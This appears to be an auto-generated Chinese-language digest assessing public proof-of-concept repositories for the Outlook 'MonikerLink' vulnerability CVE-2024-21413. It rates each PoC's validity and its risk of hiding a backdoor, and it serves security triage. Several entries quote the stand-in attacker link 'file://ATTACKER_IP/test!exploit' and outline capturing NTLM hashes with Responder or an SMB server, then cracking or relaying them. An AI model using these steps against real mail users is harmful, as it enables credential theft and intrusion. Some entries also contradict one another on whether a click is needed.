**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)
